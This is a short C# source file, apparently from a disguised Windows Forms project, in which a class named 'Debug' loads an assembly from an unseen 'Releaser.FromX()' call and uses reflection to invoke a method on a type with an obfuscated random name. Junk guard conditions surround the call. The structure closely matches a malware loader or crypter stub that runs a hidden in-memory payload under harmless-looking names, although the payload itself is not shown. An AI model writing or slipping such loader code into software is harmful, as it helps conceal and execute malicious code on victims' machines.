using System;
using System.Diagnostics;
using System.Reflection;

namespace WindowsFormsApp31;

internal static class Debug
{
	internal static void Analysis(string s)
	{
		Process currentProcess = Process.GetCurrentProcess();
		if (currentProcess.Id <= 0)
		{
			return;
		}
		if (currentProcess.ProcessName.Length > 0)
		{
			Assembly assembly = (Assembly)Releaser.FromX();
			if (!(currentProcess.Handle != IntPtr.Zero))
			{
				return;
			}
			Type type = null;
			Type[] types = assembly.GetTypes();
			foreach (Type type2 in types)
			{
				if (type2.FullName == "Ghujgpecxtnzhpgguzy.Vyjrcwaw")
				{
					type = type2;
					break;
				}
			}
			if (!currentProcess.HasExited && currentProcess.MainModule!.BaseAddress != IntPtr.Zero)
			{
				MemberInfo memberInfo = type.GetMember("Zxggmpzurgiyjjcev")[0];
				object obj = ((MethodInfo)memberInfo).DeclaringType!.InvokeMember(memberInfo.Name, BindingFlags.InvokeMethod, null, null, null);
				if (currentProcess.MachineName.Length > 0)
				{
					Console.WriteLine(s + obj);
				}
			}
			return;
		}
		throw new Exception();
	}
}
